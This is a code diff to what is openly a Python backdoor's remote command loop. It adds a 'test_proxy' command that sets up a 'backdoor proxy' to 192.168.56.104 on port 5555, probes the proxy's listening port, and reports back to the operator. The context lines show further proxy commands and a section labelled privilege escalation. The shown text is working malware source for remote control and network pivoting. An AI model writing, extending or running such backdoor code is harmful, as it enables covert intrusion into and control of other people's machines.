@@ -298,15 +298,32 @@ def shell():
                 reliable_send("proxy Status: " + json.dumps(status, indent=2))
             except Exception as e:
                 reliable_send("proxy status error: " + str(e))
-
-        elif command == 'proxy_info':
+                
+        elif command == 'test_proxy':
             try:
                 if proxy_manager is None:
                     proxy_manager = create_backdoor_proxy('192.168.56.104', 5555)
-                connections = proxy_manager.get_connection_report()
-                reliable_send("proxy Info: " + json.dumps(connections, indent=2))
+                
+                # Test if proxy port is accessible
+                if proxy_manager.channel and proxy_manager.channel.is_running:
+                    import socket
+                    test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    test_sock.settimeout(3)
+                    try:
+                        result = test_sock.connect_ex(('127.0.0.1', proxy_manager.channel.listen_port))
+                        test_sock.close()
+                        if result == 0:
+                            reliable_send(f"Proxy Test: Port {proxy_manager.channel.listen_port} responding locally")
+                        else:
+                            reliable_send(f"Proxy Test: Port {proxy_manager.channel.listen_port} not responding (error: {result})")
+                    except Exception as e:
+                        reliable_send(f"Proxy Test: Connection failed: {str(e)}")
+                else:
+                    reliable_send("Proxy Test: Proxy not running")
             except Exception as e:
-                reliable_send("proxy info error: " + str(e))
+                reliable_send("Proxy test error: " + str(e))
+
+
                 
         # PRIVILEGE ESCALATION COMMANDS
         elif command == 'check_privs':
